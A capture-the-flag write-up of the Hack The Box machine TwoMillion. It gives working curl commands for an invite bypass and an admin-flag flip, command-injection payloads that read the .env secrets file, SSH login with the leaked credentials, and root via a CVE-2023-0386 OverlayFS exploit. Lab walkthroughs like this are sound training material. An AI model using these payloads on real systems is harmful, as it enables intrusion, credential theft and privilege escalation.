# **HTB: TwoMillion - Complete Penetration Testing Writeup**

**OS:** Linux | **Difficulty:** Easy | **Technologies:** PHP, API, OverlayFS, FUSE

This write-up details the complete attack chain for the Hack The Box machine **TwoMillion**. The attack path involves interacting with a hidden API to bypass an invite code mechanism, elevating web privileges to access an administrative endpoint, and exploiting a command injection vulnerability to extract database credentials. After securing an initial SSH foothold, we escalate to root by exploiting the OverlayFS vulnerability (CVE-2023-0386) using a custom C Proof-of-Concept.

---

## **Phase 1: Reconnaissance & Virtual Host Configuration**

### **1. Host Configuration**
We begin by mapping the domain to the target IP so our tools and browser can resolve the application correctly.

* **Command:**
```bash
echo "10.129.103.169 2million.htb" | sudo tee -a /etc/hosts
```

A standard Nmap scan reveals SSH (22) and HTTP (80) are open. Browsing the website reveals an old version of the Hack The Box platform, which requires an invite code to register.

---

## **Phase 2: API Enumeration & Bypassing the Invite System**

Inspecting the client-side JavaScript (`/js/inviteapi.min.js`), we uncover an API endpoint used to generate invite codes.

### **2. Generating the Invite Code**
We send a `POST` request to the discovered endpoint to generate a code.

* **Command:**
```bash
curl -X POST http://2million.htb/api/v1/invite/generate
```

**Output:**
```json
{"0":200,"success":1,"data":{"code":"VktOOFctRDJPVEstWktYWjAtMlI2Q00=","format":"encoded"}}
```

The code is Base64 encoded. Decoding it gives us the plaintext invite code (e.g., `VKN8W-D2OTK-ZKYXZ0-2R6CM`), which we use to register an account on the web platform and log in. Once logged in, we capture our session cookie (`PHPSESSID`).


---

## **Phase 3: Web Privilege Escalation & Command Injection**

Further API enumeration (often through fuzzing or discovering a `/api/v1` route list) reveals an administrative settings endpoint and a VPN generation endpoint.

### **3. Upgrading to Admin**
We send a `PUT` request to update our account settings, explicitly setting the `is_admin` parameter to `1`.

* **Command:**
```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Content-Type: application/json" \
  -b "PHPSESSID=2474lbtlkv5pbvargk7nd67poq" \
  -d '{"email":"attacker@htb.com", "is_admin":1}'
```

### **4. Exploiting OS Command Injection**
Now acting as an administrator, we access the VPN generation endpoint (`/api/v1/admin/vpn/generate`). This endpoint takes a `username` parameter to generate a `.ovpn` file. We discover it is vulnerable to OS Command Injection by injecting a basic `id` command.

* **Command:**
```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Content-Type: application/json" \
  -b "PHPSESSID=2474lbtlkv5pbvargk7nd67poq" \
  -d '{"username":"hello; id #"}'
```
**Output:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

### **5. Extracting Credentials**
Using the same injection vector, we read the `.env` file from the web directory to look for hardcoded secrets.

* **Command:**
```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Content-Type: application/json" \
  -b "PHPSESSID=2474lbtlkv5pbvargk7nd67poq" \
  -d '{"username":"hello; cat .env #"}'
```
**Output:**
```text
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```


---

## **Phase 4: Initial Foothold (SSH)**

We reuse the discovered database credentials to authenticate to the machine via SSH as the `admin` user.

### **6. SSH Login**
* **Command:** `ssh admin@10.129.103.169`
  * **Password:** `SuperDuperPass123`


In [ ]:
# Reading the User Flag
import os
os.system('cat /home/admin/user.txt')

---

## **Phase 5: Privilege Escalation (`root`)**

### **7. Internal Enumeration & System Hints**
While exploring the system, we check the local mail directory and find an interesting message from `ch4p` to `admin`.

* **Command:** `cat /var/mail/admin`

The email explicitly mentions a nasty Linux kernel CVE related to **OverlayFS / FUSE** that needs patching. This is a direct hint pointing towards **CVE-2023-0386**.

### **8. Exploiting OverlayFS (CVE-2023-0386)**
We navigate to `/tmp` and utilize the DataDog Proof-of-Concept exploit for CVE-2023-0386. We transfer or create `poc.c` on the target machine.

* **Command:**
```bash
cd /tmp
nano poc.c  # Paste the C code from DataDog's repo
```

We compile the exploit statically, linking the required FUSE and dynamic loading libraries.

* **Command:**
```bash
gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl
```

We execute the compiled binary. The exploit unshares the mount namespace, creates an overlay mount, and abuses the FUSE file system to copy a SUID root binary, ultimately dropping us into a root shell.

* **Command:**
```bash
chmod +x poc && ./poc
```

**Exploit Execution Output:**
```text
Waiting 1 sec...
unshare -r -m sh -c 'mount -t overlay overlay -o lowerdir=/tmp/ovlcap/lower,upperdir=/tmp/ovlcap/upper,workdir=/tmp/ovlcap/work /tmp/ovlcap/merge && ls -la /tmp/ovlcap/merge && touch /tmp/ovlcap/merge/file'
[+] readdir
[+] getattr_callback
[+] open_callback
...
root@2million:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)
```


In [ ]:
# Reading the Root Flag
os.system('cat /root/root.txt')

---

## **Summary: Complete Command Tally**

Here is the exact list of the core terminal commands utilized to conquer TwoMillion from start to finish:

| # | Phase | Command |
| --- | --- | --- |
| 1 | Recon | `echo "10.129.103.169 2million.htb" \| sudo tee -a /etc/hosts` |
| 2 | Invite Gen | `curl -X POST http://2million.htb/api/v1/invite/generate` |
| 3 | Decode | `echo "<BASE64_STRING>" \| base64 -d` |
| 4 | Web PrivEsc | `curl -X PUT .../api/v1/admin/settings/update -b "PHPSESSID=..." -d '{"email":"x@x.com", "is_admin":1}'` |
| 5 | RCE (id) | `curl -X POST .../api/v1/admin/vpn/generate -b "PHPSESSID=..." -d '{"username":"hello; id #"}'` |
| 6 | RCE (.env) | `curl -X POST .../api/v1/admin/vpn/generate -b "PHPSESSID=..." -d '{"username":"hello; cat .env #"}'` |
| 7 | SSH Access | `ssh admin@10.129.103.169` |
| 8 | User Flag | `cat user.txt` |
| 9 | PrivEsc Enum | `cat /var/mail/admin` |
| 10 | PrivEsc Prep | `cd /tmp && nano poc.c` |
| 11 | Compile PoC | `gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl` |
| 12 | Exec PoC | `chmod +x poc && ./poc` |
| 13 | Root Flag | `cat /root/root.txt` |
